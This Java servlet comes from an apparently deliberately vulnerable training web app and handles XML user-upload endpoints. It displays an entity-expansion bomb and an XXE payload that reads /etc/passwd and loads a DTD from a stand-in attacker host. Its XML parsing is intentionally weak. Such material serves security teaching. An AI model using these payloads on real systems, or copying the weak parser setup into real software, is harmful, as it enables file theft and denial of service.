package org.t246osslab.easybuggy.vulnerabilities;

import java.io.File;
import java.io.IOException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Locale;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import javax.xml.XMLConstants;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.t246osslab.easybuggy.core.dao.DBClient;
import org.t246osslab.easybuggy.core.servlets.AbstractServlet;
import org.t246osslab.easybuggy.core.utils.Closer;
import org.t246osslab.easybuggy.core.utils.MultiPartFileUtils;
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

@SuppressWarnings("serial")
@WebServlet(urlPatterns = { "/xee", "/xxe" })
// 2MB, 10MB, 50MB
@MultipartConfig(fileSizeThreshold = 1024 * 1024 * 2, maxFileSize = 1024 * 1024 * 10, maxRequestSize = 1024 * 1024 * 50)
public class XEEandXXEServlet extends AbstractServlet {

    // Name of the directory where uploaded files is saved
    private static final String SAVE_DIR = "uploadFiles";

    private static final String TAB = "&nbsp;&nbsp;&nbsp;&nbsp;";
    
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {

        Locale locale = req.getLocale();

        StringBuilder bodyHtml = new StringBuilder();
        if ("/xee".equals(req.getServletPath())) {
            bodyHtml.append("<form method=\"post\" action=\"xee\" enctype=\"multipart/form-data\">");
            bodyHtml.append(getMsg("msg.add.users.by.xml", locale));
        } else {
            bodyHtml.append("<form method=\"post\" action=\"xxe\" enctype=\"multipart/form-data\">");
            bodyHtml.append(getMsg("msg.update.users.by.xml", locale));
        }
        bodyHtml.append("<br><br>");
        bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
        bodyHtml.append(encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
        bodyHtml.append(encodeForHTML("<users>") + "<br>");
        bodyHtml.append(TAB);
        bodyHtml.append(encodeForHTML("<user uid=\"user11\" name=\"Tommy\" password=\"pasworld\" " +
                "phone=\"090-1004-5678\" mail=\"user11@example.com\"/>"));
        bodyHtml.append("<br>");
        bodyHtml.append(TAB);
        bodyHtml.append(encodeForHTML("<user uid=\"user12\" name=\"Matt\" password=\"PaSsWoRd\" " +
                "phone=\"090-9984-1118\" mail=\"user12@example.com\"/>"));
        bodyHtml.append("<br>");
        bodyHtml.append(encodeForHTML("</users>"));
        bodyHtml.append("</pre>");
        bodyHtml.append("<br>");
        bodyHtml.append("<input type=\"file\" name=\"file\" size=\"60\" /><br>");
        bodyHtml.append(getMsg("msg.select.upload.file", locale));
        bodyHtml.append("<br><br>");
        bodyHtml.append("<input type=\"submit\" value=\"" + getMsg("label.upload", locale) + "\" />");
        bodyHtml.append("<br><br>");
        if (req.getAttribute("errorMessage") != null) {
            bodyHtml.append(req.getAttribute("errorMessage"));
        }
        if ("/xee".equals(req.getServletPath())) {
            bodyHtml.append(getInfoMsg("msg.note.xee", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(encodeForHTML("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>") + "<br>");
            bodyHtml.append(encodeForHTML("<!DOCTYPE s[") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x0 \"ha!\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x1 \"&x0;&x0;\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x2 \"&x1;&x1;\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x3 \"&x2;&x2;)\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!-- Entities from x4 to x98... -->") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x99 \"&x98;&x98;\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY x100 \"&x99;&x99;\">") + "<br>");
            bodyHtml.append(encodeForHTML("]>") + "<br>");
            bodyHtml.append(encodeForHTML("<soapenv:Envelope xmlns:soapenv=\"...\" xmlns:ns1=\"...\">")+ "<br>");
            bodyHtml.append(TAB + encodeForHTML("<soapenv:Header>") + "<br>");
            bodyHtml.append(TAB + encodeForHTML("</soapenv:Header>") + "<br>");
            bodyHtml.append(TAB + encodeForHTML("<soapenv:Body>") + "<br>");
            bodyHtml.append(TAB + TAB + encodeForHTML("<ns1:reverse>") + "<br>");
            bodyHtml.append(TAB + TAB + TAB + encodeForHTML("<s>&x100;</s>") + "<br>");
            bodyHtml.append(TAB + TAB + encodeForHTML("</ns1:reverse>") + "<br>");
            bodyHtml.append(TAB + encodeForHTML("</soapenv:Body>") + "<br>");
            bodyHtml.append(encodeForHTML("</soapenv:Envelope>") + "<br>");
            bodyHtml.append("</pre>");
            bodyHtml.append("</form>");
            responseToClient(req, res, getMsg("title.xee.page", locale), bodyHtml.toString());
        } else {
            bodyHtml.append(getInfoMsg("msg.note.xxe.step1", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(encodeForHTML("<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">") + "<br>");
            bodyHtml.append(encodeForHTML("<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">") + "<br>");
            bodyHtml.append(encodeForHTML("%p2;"));
            bodyHtml.append("</pre>");
            bodyHtml.append("<br>");
            bodyHtml.append(getInfoMsg("msg.note.xxe.step2", locale));
            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
            bodyHtml.append(encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
            bodyHtml.append(encodeForHTML("<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >") + "<br>");
            bodyHtml.append(encodeForHTML("<users />"));
            bodyHtml.append("</pre>");
            bodyHtml.append("</form>");
            responseToClient(req, res, getMsg("title.xxe.page", locale), bodyHtml.toString());
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {

        Locale locale = req.getLocale();

        // Get absolute path of the web application
        String appPath = req.getServletContext().getRealPath("");

        // Create a directory to save the uploaded file if it does not exists
        String savePath = appPath + File.separator + SAVE_DIR;
        File fileSaveDir = new File(savePath);
        if (!fileSaveDir.exists()) {
            fileSaveDir.mkdir();
        }

        // Save the file
        Part filePart = null;
        try {
            filePart = req.getPart("file");
        } catch (Exception e) {
            req.setAttribute("errorMessage", getMsg("msg.max.file.size.exceed", locale));
            doGet(req, res);
            return;
        }
        try {
            String fileName = MultiPartFileUtils.getFileName(filePart);
            if (StringUtils.isBlank(fileName)) {
                doGet(req, res);
                return;
            } else if (!fileName.endsWith(".xml")) {
                req.setAttribute("errorMessage", getErrMsg("msg.not.xml.file", locale));
                doGet(req, res);
                return;
            }
            MultiPartFileUtils.writeFile(filePart, savePath, fileName);

            CustomHandler customHandler = new CustomHandler();
            customHandler.setLocale(locale);
            boolean isRegistered = parseXML(req, savePath, fileName, customHandler);

            StringBuilder bodyHtml = new StringBuilder();
            if (isRegistered && customHandler.isRegistered()) {
                if ("/xee".equals(req.getServletPath())) {
                    bodyHtml.append(getMsg("msg.batch.registration.complete", locale));
                } else {
                    bodyHtml.append(getMsg("msg.batch.update.complete", locale));
                }
                bodyHtml.append("<br><br>");
            } else {
                if ("/xee".equals(req.getServletPath())) {
                    bodyHtml.append(getErrMsg("msg.batch.registration.fail", locale));
                } else {
                    bodyHtml.append(getErrMsg("msg.batch.update.fail", locale));
                }
            }
            bodyHtml.append(customHandler.getResult());
            bodyHtml.append("<input type=\"button\" onClick='history.back();' value=\""
                    + getMsg("label.history.back", locale) + "\">");
            if ("/xee".equals(req.getServletPath())) {
                responseToClient(req, res, getMsg("title.xee.page", locale), bodyHtml.toString());
            } else {
                responseToClient(req, res, getMsg("title.xxe.page", locale), bodyHtml.toString());
            }
        } catch (Exception e) {
            log.error("Exception occurs: ", e);
        }
    }

    private boolean parseXML(HttpServletRequest req, String savePath, String fileName, 
            CustomHandler customHandler) {
        boolean isRegistered = false;
        SAXParser parser;
        try {
            File file = new File(savePath + File.separator + fileName);
            SAXParserFactory spf = SAXParserFactory.newInstance();
            if ("/xee".equals(req.getServletPath())) {
                customHandler.setInsert();
                spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
                spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            } else {
                spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            }
            parser = spf.newSAXParser();
            parser.parse(file, customHandler);
            isRegistered = true;
        } catch (ParserConfigurationException e) {
            log.error("ParserConfigurationException occurs: ", e);
        } catch (SAXException e) {
            log.error("SAXException occurs: ", e);
        } catch (Exception e) {
            log.error("Exception occurs: ", e);
        }
        return isRegistered;
    }

    public class CustomHandler extends DefaultHandler {
        private StringBuilder result = new StringBuilder();
        private boolean isRegistered = false;
        private boolean isUsersExist = false;
        private boolean isInsert = false;
        private Locale locale = null;

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes)
                throws SAXException {
            if ("users".equals(qName)) {
                isUsersExist = true;
                result.append("<table class=\"table table-striped table-bordered table-hover\" style=\"font-size:small;\">");
                result.append("<tr>");
                result.append("<th>" + getMsg("label.user.id", locale) + "</th>");
                result.append("<th>" + getMsg("label.name", locale) + "</th>");
                result.append("<th>" + getMsg("label.password", locale) + "</th>");
                result.append("<th>" + getMsg("label.phone", locale) + "</th>");
                result.append("<th>" + getMsg("label.mail", locale) + "</th>");
                result.append("</tr>");
            } else if (isUsersExist && "user".equals(qName)) {
                String executeResult = upsertUser(attributes, locale);
                result.append("<tr>");
                result.append("<td>" + encodeForHTML(attributes.getValue("uid")) + "</td>");
                if (executeResult == null) {
                    result.append("<td>" + encodeForHTML(attributes.getValue("name")) + "</td>");
                    result.append("<td>" + encodeForHTML(attributes.getValue("password")) + "</td>");
                    result.append("<td>" + encodeForHTML(attributes.getValue("phone")) + "</td>");
                    result.append("<td>" + encodeForHTML(attributes.getValue("mail")) + "</td>");
                } else {
                    result.append("<td colspan=\"4\">" + executeResult + "</td>");
                }
                result.append("</tr>");
                isRegistered = true;
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) throws SAXException {
            if ("users".equals(qName)) {
                result.append("</table>");
            }
        }

        void setInsert() {
            this.isInsert  = true;
        }
        
        void setLocale(Locale locale) {
            this.locale  = locale;
        }
        
        String getResult() {
            return result.toString();
        }

        boolean isRegistered() {
            return isRegistered;
        }
        
        String upsertUser(Attributes attributes, Locale locale) {

            PreparedStatement stmt = null;
            PreparedStatement stmt2 = null;
            ResultSet rs = null;
            Connection conn = null;
            String resultMessage = null;
            try {

                conn = DBClient.getConnection();
                conn.setAutoCommit(true);

                stmt = conn.prepareStatement("select * from users where id = ?");
                stmt.setString(1, attributes.getValue("uid"));
                rs = stmt.executeQuery();
                if (rs.next()) {
                    if (isInsert) {
                        return getMsg("msg.user.already.exist", locale);
                    }
                } else {
                    if (!isInsert) {
                        return getMsg("msg.user.not.exist", locale);
                    }
                }
                if (isInsert) {
                    stmt2 = conn.prepareStatement("insert into users values (?, ?, ?, ?, ?, ?, ?)");
                    stmt2.setString(1, attributes.getValue("uid"));
                    stmt2.setString(2, attributes.getValue("name"));
                    stmt2.setString(3, attributes.getValue("password"));
                    stmt2.setString(4, RandomStringUtils.randomNumeric(10));
                    stmt2.setString(5, "true");
                    stmt2.setString(6, attributes.getValue("phone"));
                    stmt2.setString(7, attributes.getValue("mail"));
                    if (stmt2.executeUpdate() != 1) {
                        resultMessage = getMsg("msg.user.already.exist", locale);
                    }
                } else {
                    stmt2 = conn.prepareStatement("update users set name = ?, password = ?, phone = ?, mail = ? where id = ?");
                    stmt2.setString(1, attributes.getValue("name"));
                    stmt2.setString(2, attributes.getValue("password"));
                    stmt2.setString(3, attributes.getValue("phone"));
                    stmt2.setString(4, attributes.getValue("mail"));
                    stmt2.setString(5, attributes.getValue("uid"));
                    if (stmt2.executeUpdate() != 1) {
                        resultMessage = getMsg("msg.user.not.exist", locale);
                    }
                }
            } catch (SQLException e) {
                resultMessage = getMsg("msg.unknown.exception.occur", new String[] { e.getMessage() }, locale);
                log.error("SQLException occurs: ", e);
            } catch (Exception e) {
                resultMessage = getMsg("msg.unknown.exception.occur", new String[] { e.getMessage() }, locale);
                log.error("Exception occurs: ", e);
            } finally {
                Closer.close(rs);
                Closer.close(stmt);
                Closer.close(stmt2);
                Closer.close(conn);
            }
            return resultMessage;
        }
    }
}
